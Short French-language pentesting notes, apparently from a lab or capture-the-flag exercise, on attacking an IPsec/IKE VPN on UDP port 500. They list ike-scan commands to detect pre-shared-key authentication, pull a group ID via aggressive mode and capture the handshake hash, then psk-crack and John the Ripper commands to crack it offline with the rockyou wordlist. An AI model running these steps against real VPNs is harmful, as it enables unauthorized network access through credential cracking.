
https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp#identify-vpn-vendor-and-configuration

https://book.hacktricks.wiki/en/network-services-pentesting/ipsec-ike-vpn-pentesting.html?highlight=500#discover-the-service-using-nmap



1. Identifier si auth=psk -> signifie qu'une pre shared key est utilisée pour l'authentification.

Si handshake returned alors possible de le cracker offline si le mode agressif est activé.

```
ike-scan -M 10.10.11.87
```

2. Essayer de récupérer un ID (group ou utilisateur) avec le mode agressif

```
ike-scan -M -A 10.10.11.87
```

3. Si possible de récupérer l'id avec le mode agressif, enregistrer le hash du handshake afin de le cracker

```
ike-scan -A -M 10.10.11.87 --pskcrack=ike_hash
```


4. Cracker le hash avec psk-crack

```
psk-crack ike_hash --dictionary=/usr/share/wordlists/rockyou.txt
```

ou avec john

```
ikescan2john ike_hash > ike.john
john ike.john --wordlist=/usr/share/wordlists/rockyou.txt
```
